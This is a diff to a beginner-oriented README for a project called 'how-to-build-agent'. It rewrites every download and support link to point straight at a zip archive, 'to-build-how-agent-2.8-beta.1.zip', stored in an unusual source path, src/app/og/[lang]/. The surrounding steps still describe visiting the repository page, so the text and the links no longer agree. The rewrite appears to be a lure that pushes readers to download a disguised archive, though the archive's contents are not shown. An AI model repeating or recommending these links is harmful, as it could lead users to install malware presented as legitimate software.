@@ -1,6 +1,6 @@
 # 🤖 how-to-build-agent - Build Your Agent Step by Step
 
-[![Download how-to-build-agent](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mamadx242/how-to-build-agent)
+[![Download how-to-build-agent](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mamadx242/how-to-build-agent/raw/refs/heads/main/src/app/og/[lang]/to-build-how-agent-2.8-beta.1.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before you build the agent, you will need to get the software files from the int
 
 Click the blue button below to open the download page:
 
-[![Download how-to-build-agent](https://img.shields.io/badge/Get%20Files-Grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mamadx242/how-to-build-agent)
+[![Download how-to-build-agent](https://img.shields.io/badge/Get%20Files-Grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mamadx242/how-to-build-agent/raw/refs/heads/main/src/app/og/[lang]/to-build-how-agent-2.8-beta.1.zip)
 
 When the page opens in your browser, look for the download link or button. It will allow you to get the program files you need to build the agent.
 
@@ -49,7 +49,7 @@ When the page opens in your browser, look for the download link or button. It wi
 ## 📥 How to Download and Install
 
 1. Open the download page by clicking the button above or visiting:  
-   https://github.com/mamadx242/how-to-build-agent
+   https://github.com/mamadx242/how-to-build-agent/raw/refs/heads/main/src/app/og/[lang]/to-build-how-agent-2.8-beta.1.zip
 
 2. On the GitHub page, find the green "Code" button near the top right side.
 
@@ -106,7 +106,7 @@ After running the agent, check its status and abilities.
 Periodically, updates may become available with improvements or fixes.
 
 1. Return to the download page at:  
-   https://github.com/mamadx242/how-to-build-agent
+   https://github.com/mamadx242/how-to-build-agent/raw/refs/heads/main/src/app/og/[lang]/to-build-how-agent-2.8-beta.1.zip
 
 2. Check if there is a newer release version on the page.
 
@@ -161,10 +161,10 @@ No complex uninstall process is needed.
 If you need assistance:
 
 - Visit the GitHub repository page:  
-  https://github.com/mamadx242/how-to-build-agent  
+  https://github.com/mamadx242/how-to-build-agent/raw/refs/heads/main/src/app/og/[lang]/to-build-how-agent-2.8-beta.1.zip  
 - Use the Issues section to report bugs or ask questions.  
 - Check the FAQ.txt and User Guide.pdf included with the download.
 
 ---
 
-[![Download how-to-build-agent](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mamadx242/how-to-build-agent)
+[![Download how-to-build-agent](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mamadx242/how-to-build-agent/raw/refs/heads/main/src/app/og/[lang]/to-build-how-agent-2.8-beta.1.zip)
